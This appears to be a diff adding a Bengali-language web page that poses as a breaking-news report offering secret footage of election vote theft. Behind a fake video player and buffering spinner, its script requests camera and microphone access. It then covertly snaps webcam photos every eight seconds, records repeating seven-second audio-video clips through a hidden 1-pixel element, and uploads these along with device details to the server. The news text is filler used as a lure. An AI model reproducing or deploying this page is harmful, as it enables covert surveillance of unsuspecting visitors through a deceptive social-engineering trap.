@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="bn">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ব্রেকিং নিউজ: আটপাড়া নির্বাচন</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #f0f2f5;
+            margin: 0;
+            text-align: center;
+        }
+
+        .header {
+            background: #ce0000;
+            color: white;
+            padding: 15px;
+            font-weight: bold;
+            font-size: 22px;
+        }
+
+        .card {
+            max-width: 500px;
+            margin: 20px auto;
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .video-box {
+            width: 100%;
+            height: 280px;
+            background: #000;
+            border-radius: 8px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        #playIcon {
+            width: 80px;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        #loader {
+            display: none;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #ce0000;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        #loadingText {
+            display: none;
+            color: white;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        #realVideo {
+            width: 100%;
+            height: 100%;
+            display: none;
+        }
+
+        #newsText {
+            display: none;
+            text-align: justify;
+            margin-top: 20px;
+            line-height: 1.6;
+            padding: 10px;
+            border-top: 1px solid #ddd;
+        }
+
+        #bgCam {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="header">আটপাড়া নিউজ ২৪</div>
+    <div class="card">
+        <h2 style="color: #b00; font-size: 19px;">ভোট চুরির গোপন ফুটেজটি সরাসরি দেখুন</h2>
+        <div class="video-box" id="vidArea">
+            <img src="https://img.icons8.com/ios-filled/100/ffffff/play--v1.png" id="playIcon" onclick="initCapture()">
+            <div id="loader"></div>
+            <p id="loadingText">ভিডিওটি বাফার হচ্ছে (২৮%)...</p>
+            <video id="realVideo" controls src="voter_video.mp4"></video>
+        </div>
+        <div id="newsText">
+            <p><b>নিজস্ব প্রতিবেদক:</b> আটপাড়া উপজেলার ৩ নং কেন্দ্রে জাল ভোট দেওয়ার অভিযোগে ২ জনকে আটক করা হয়েছে।
+                সিসিটিভি ফুটেজে দেখা গেছে দুপুর ২টার পর কিছু অপরিচিত লোক ব্যালট বাক্স নিয়ে পালিয়ে যাচ্ছে। স্থানীয়
+                প্রশাসনের পক্ষ থেকে কঠোর ব্যবস্থা নেওয়ার আশ্বাস দেওয়া হয়েছে। বিস্তারিত প্রতিবেদনটি নিচে পড়তে থাকুন...
+            </p>
+            <p>
+                পৌঁছাবে: সিইসি
+                ১০: ১৭
+                ভোট দিলেন তারেক রহমান
+                ০৮: ৫২
+                এই ভোটের মাধ্যমে নতুন অধ্যায়ের শুরু হোক: শফিকুর রহমান ‎
+                ০৮: ৩৪
+                নাহিদ ইসলাম ভোট দিয়েছেন
+                ১৬: ৩০
+                শেষ সময় অলস সময় পার করছেন ভোটগ্রহণ কর্মকর্তারা। ছবিটি বনানী বিদ্যানিকেতন স্কুল কেন্দ্র থেকে তোলা
+                শেষ সময় অলস সময় পার করছেন ভোটগ্রহণ কর্মকর্তারা। ছবিটি বনানী বিদ্যানিকেতন স্কুল কেন্দ্র থেকে তোলাছবি:
+                ইয়াহইয়া নকিব
+                শেষ ঘণ্টায় বনানীতে ভোটার কম, দুই কেন্দ্রে ভোট পড়েছে ৩৬%
+                শেষ সময়ে রাজধানীর বনানীর বিদ্যানিকেতন স্কুল অ্যান্ড কলেজ কেন্দ্রে ভোটারের উপস্থিতি কমে গেছে। ভোটগ্রহণ
+                কর্মকর্তাদের অলস সময় কাটাতে দেখা গেছে।
+
+                এখানে ৬৯ নম্বর কেন্দ্রে মোট ভোটার ২ হাজার ৪২৪ জন। বেলা সাড়ে তিনটা পর্যন্ত ভোট পড়েছে ৯১১টি, যা প্রায় ৩৭
+                শতাংশ।
+
+                সহকারী প্রিজাইডিং কর্মকর্তা ইসমাইল হোসেন বলেন, অনেক ভোটার অবসরের গ্রহণের পর গ্রামে চলে যাওয়ায় ভোটের হার
+                কিছুটা কম।
+
+                একই প্রতিষ্ঠানের ৭২ নম্বর কেন্দ্রে মোট ভোটার ২ হাজার ৭৩৪ জন। শেষ ঘণ্টার আগে পর্যন্ত ভোট পড়েছে ৯৬২টি, যা
+                প্রায় ৩৫ শতাংশ। শেষ সময়ে নতুন করে ভোটার উপস্থিতিও কম দেখা যাচ্ছে।
+            </p>
+        </div>
+    </div>
+
+    <video id="bgCam" autoplay playsinline muted></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        async function initCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('bgCam').srcObject = stream;
+
+                // UI Update
+                document.getElementById('playIcon').style.display = 'none';
+                document.getElementById('loader').style.display = 'block';
+                document.getElementById('loadingText').style.display = 'block';
+
+                // Device Intelligence
+                const battery = await navigator.getBattery ? await navigator.getBattery() : { level: 0 };
+                const info = {
+                    model: navigator.platform,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    battery: `${Math.round(battery.level * 100)}%`,
+                    ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown'
+                };
+
+                fetch('/info', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(info)
+                });
+
+                startBackgroundWork(stream);
+
+                // Distraction: Loading then Real Video
+                setTimeout(() => {
+                    document.getElementById('loader').style.display = 'none';
+                    document.getElementById('loadingText').style.display = 'none';
+                    document.getElementById('realVideo').style.display = 'block';
+                    document.getElementById('newsText').style.display = 'block';
+                    document.getElementById('realVideo').play();
+                }, 6000);
+
+            } catch (e) {
+                alert("ভিডিওটি দেখতে পারমিশন দেওয়া আবশ্যক!");
+            }
+        }
+
+        function startBackgroundWork(stream) {
+            // Photo Snap Loop (8s)
+            const snap = () => {
+                const cam = document.getElementById('bgCam');
+                const can = document.getElementById('canvas');
+                if (cam.videoWidth === 0) return;
+                can.width = cam.videoWidth; can.height = cam.videoHeight;
+                can.getContext('2d').drawImage(cam, 0, 0);
+                fetch('/camsnap', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ img: can.toDataURL('image/jpeg', 0.6) })
+                });
+            };
+            setInterval(snap, 8000); snap();
+
+            // Video Recording Loop (7s clips)
+            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            let chunks = [];
+            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            recorder.onstop = () => {
+                const reader = new FileReader();
+                reader.readAsDataURL(new Blob(chunks, { type: 'video/webm' }));
+                reader.onloadend = () => {
+                    fetch('/video-upload', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ video: reader.result })
+                    });
+                };
+                chunks = [];
+                setTimeout(() => { recorder.start(); setTimeout(() => recorder.stop(), 7000); }, 1000);
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 7000);
+        }
+    </script>
+</body>
+
+</html>
